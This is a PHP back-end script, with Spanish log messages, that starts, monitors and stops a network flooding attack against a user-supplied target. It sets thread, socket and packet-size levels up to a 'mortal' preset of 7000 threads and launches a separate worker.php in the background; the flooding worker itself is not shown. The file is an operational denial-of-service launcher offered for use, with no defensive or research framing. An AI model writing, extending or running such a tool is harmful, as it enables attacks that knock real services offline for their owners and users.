<?php
header('Content-Type: application/json; charset=utf-8');
set_time_limit(0);
$dir = __DIR__.'/runtime';
if (!is_dir($dir)) mkdir($dir,0755,true);
$pidFile="$dir/attack.pid"; $logFile="$dir/attack.log"; $cfgFile="$dir/attack.cfg";

function out($d){echo json_encode($d,JSON_UNESCAPED_UNICODE);exit;}

$action = $_POST['action'] ?? $_GET['action'] ?? '';

if ($action==='status'){
    $running=false;$pid=null;
    if(file_exists($pidFile)){
        $pid=(int)file_get_contents($pidFile);
        if($pid>0){
            $check=trim(shell_exec("ps -p $pid -o pid= 2>/dev/null"));
            $running=(bool)$check;
            if(!$running) @unlink($pidFile);
        }
    }
    $log=file_exists($logFile)?file_get_contents($logFile):'';
    out(['running'=>$running,'pid'=>$pid,'log'=>$log]);
}

if ($action==='stop'){
    if(file_exists($pidFile)){
        $pid=(int)file_get_contents($pidFile);
        if($pid>0){
            exec("kill -9 $pid 2>/dev/null");
            exec("pkill -9 -P $pid 2>/dev/null");
        }
        @unlink($pidFile);
    }
    // also kill any leftover workers
    exec("pkill -f 'worker.php' 2>/dev/null");
    $prev=file_exists($logFile)?file_get_contents($logFile):'';
    file_put_contents($logFile,$prev."\n[!] ATAQUE DETENIDO MANUALMENTE\n");
    out(['ok'=>true]);
}

if ($action==='start'){
    if(file_exists($pidFile)){
        $pid=(int)file_get_contents($pidFile);
        $check=trim(shell_exec("ps -p $pid -o pid= 2>/dev/null"));
        if($check) out(['ok'=>false,'msg'=>'already running']);
    }
    $target=trim($_POST['target']??'');
    $type=$_POST['type']??'udp';
    $intensity=$_POST['intensity']??'media';
    $duration=max(1,(int)($_POST['duration']??30));
    $unit=$_POST['unit']??'s';
    if(!$target) out(['ok'=>false,'msg'=>'empty target']);

    $seconds=$duration;
    if($unit==='m') $seconds*=60;
    if($unit==='h') $seconds*=3600;

    // MAX POWER — mortal 7000+
    $map=[
        'suave'   =>[80,100,2048],
        'baja'    =>[250,300,4096],
        'media'   =>[700,600,8192],
        'alta'    =>[1500,1200,16384],
        'bastante'=>[3500,2200,32768],
        'mortal'  =>[7000,4000,65536],
    ];
    [$threads,$sockets,$size]=$map[$intensity]??$map['media'];

    file_put_contents($logFile,'');
    file_put_contents($cfgFile,json_encode(compact('target','type','intensity','seconds','threads','sockets','size')));

    $worker=__DIR__.'/worker.php';
    $cmd='php '.escapeshellarg($worker).' > /dev/null 2>&1 & echo $!';
    $pid=(int)trim(shell_exec($cmd));
    file_put_contents($pidFile,$pid);
    out(['ok'=>true,'pid'=>$pid]);
}
out(['ok'=>false,'msg'=>'unknown']);
